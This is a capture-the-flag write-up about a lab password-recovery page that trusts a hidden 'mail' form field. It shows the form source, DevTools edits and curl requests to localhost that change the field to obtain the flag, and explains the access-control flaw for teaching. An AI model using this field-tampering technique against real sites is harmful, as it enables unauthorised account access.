# Recover — Writeup

**Page:** `http://127.0.0.1:8080/?page=recover` (reached via "I forgot my password" on `?page=signin`).
**Flag:** `1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0`

## Mechanism

View Page Source shows the form:

```html
<form action="#" method="POST">
    <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
    <input type="submit" name="Submit" value="Submit">
</form>
```

There is **no visible input field** — only a hidden `mail` field with a preset value and a submit button. (`maxlength="15"` limits nothing here: it only applies to keyboard typing into a visible field, not to a value edited in the DOM or sent by curl — and the preset value is already longer than 15.)

The server checks only one thing: *does the submitted `mail` match the hard-coded default?*

- unchanged (default) → returns `images/WrongAnswer.gif`;
- any other value → returns the flag and `images/win.png`.

This is a logic/access-control flaw: the developer hid the "secret" value in a hidden HTML field, assuming that being invisible means unchangeable. Any form field, including `hidden`, is fully client-controlled. The server never verifies identity (no token, no DB check, no email) — the only "success" criterion is that the value differs from the default.

## Reproduction

**Via browser (DevTools):**

1. Open `?page=recover`, F12 → Elements.
2. Find `<input type="hidden" name="mail" value="webmaster@borntosec.com" ...>`.
3. Edit the `value` attribute to anything else (e.g. `attacker@email.com`), press Enter.
4. Click Submit → the page shows the flag and `images/win.png`.

**Via curl:**

```bash
# Baseline (default value) -> WrongAnswer
curl -s 'http://127.0.0.1:8080/?page=recover' \
     --data 'mail=webmaster%40borntosec.com&Submit=Submit' -o before.html

# Exploit (changed value) -> flag
curl -s 'http://127.0.0.1:8080/?page=recover' \
     --data 'mail=attacker%40email.com&Submit=Submit' -o after.html

diff before.html after.html
```

Both change only one variable (the `mail` value), proving the server reacts purely to the value differing from the default.

## Flag comparison

Flag obtained through exploitation:

```
1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
```

Note: the page may show the flag in uppercase due to CSS `text-transform: uppercase`; the real value in the HTML source is lowercase, as above. Compared byte-for-byte with the `flag` file in the submission folder during the defense.
